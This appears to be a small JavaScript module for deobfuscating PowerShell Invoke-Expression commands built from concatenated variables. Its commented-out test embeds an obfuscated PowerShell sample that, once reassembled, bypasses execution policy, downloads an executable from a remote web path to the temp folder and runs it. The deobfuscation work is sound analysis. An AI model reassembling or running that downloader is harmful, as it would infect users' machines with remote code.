/*
    Module to get a simple dump of of a PowerShell Invoke


*/

function invokeDecode(runCommand){

    var findInvoke= /(.+)(Invoke-Expression[\s]*[(]([$]\w+[+]*)+[)]);/g;
    var expressionPattern =/([$]\w+='[\w\d\s.:\(\)\[\]\{\}^/;]+';)/g;
    var splitKeyValue = /[$](\w+=)'([\w\d\s.:\(\)\[\]\{\}^/;]+)/g;
    var varPars = {};

    var varExpressionsRaw = runCommand.replace(findInvoke, "$1").trim();

    var invokeRaw = runCommand.replace(findInvoke, "$2").trim();

    //get the all of the expressions
    var varExpressions = varExpressionsRaw.replace(expressionPattern, "$1").split("';");

    //add all of the expression variables to KeyValue pars
    varExpressions.forEach(function(varExpression){
        var currentPar = varExpression.replace(splitKeyValue, "$1$2").split("=");
        if(currentPar[0]){
            varPars[currentPar[0]] = currentPar[1];
        }
    });

    var invokeParse = invokeRaw;
    for(var key in varPars){
        invokeParse = invokeParse.replace(key, varPars[key]);
    }

        invokeParse = invokeParse.replace(/[+]/g, '');
        var finalInvoke = invokeParse.replace(/[$^]/g, '');

    /*
        these get Loaded into Key Value Pars on a JSON Object. Then the invoke Line is Striped and using a looping find and Replace all of the Variables on the Invoke are replace with their values from the JSON object. The + items are remove as are the ^ and the line is then returned
    */
    if(invokeParse === "undefined"){

        finalInvoke = invokeRaw;
    }

    return {
        invokeDecode:finalInvoke
    };


}


module.exports = {
    invokeDecode:invokeDecode
}
/*
(function Test(){

   InvokeDecode("$knere='^des/';$amebe='^ownl';$ksody='^nPol';$avpazu='^th);';$qevdi='^ile(';$lcagsa='^com/';$sewrokw='^Scop';$ejajzi='^xe'')';$encawo='^cz.e';$osxyzv='^''pr';$ebsoxa='^lien';$ucjytxy='^   Sys';$apcozo='^Webc';$ajen='^nclu';$ynedla='^nv:t';$evexw='^ss $';$awuve='^Exec';$ipvern='^ject';$efbepma='^ss -';$xuqa='^path';$igcyvu='^emp+';$eren='^icy ';$yqucr='^e    Pr';$bsexwon='^Net.';$pejy='^opla';$avzihzo='^wp-i';$ubzuhl='^path';$pkuza='^;(Ne';$qogqy='^    Sta';$nhiwpej='^ahfi';$utikg='^tem.';$kvezbe='^tefo';$ojyw='^oces';$lesus='^''htt';$ikuva='^=($e';$svizvu='^utio';$kocvi='^rt-P';$iqaqz='^s; $';$vlide='^Set-';$emihi='^rss.';$mpyqzacn='^vfr''';$dafqaf='^p://';$faho='^rme.';$unrivv='^w-Ob';$redzy='^,$pa';$ebowpe='^oadF';$zeza='^roce';$hufipm='^Bypa';$xuvo='^t).D'; Invoke-Expression ($vlide+$awuve+$svizvu+$ksody+$eren+$hufipm+$efbepma+$sewrokw+$yqucr+$ojyw+$iqaqz+$ubzuhl+$ikuva+$ynedla+$igcyvu+$osxyzv+$nhiwpej+$encawo+$ejajzi+$pkuza+$unrivv+$ipvern+$ucjytxy+$utikg+$bsexwon+$apcozo+$ebsoxa+$xuvo+$amebe+$ebowpe+$qevdi+$lesus+$dafqaf+$pejy+$kvezbe+$faho+$lcagsa+$avzihzo+$ajen+$knere+$emihi+$mpyqzacn+$redzy+$avpazu+$qogqy+$kocvi+$zeza+$evexw+$xuqa);");

})()

*/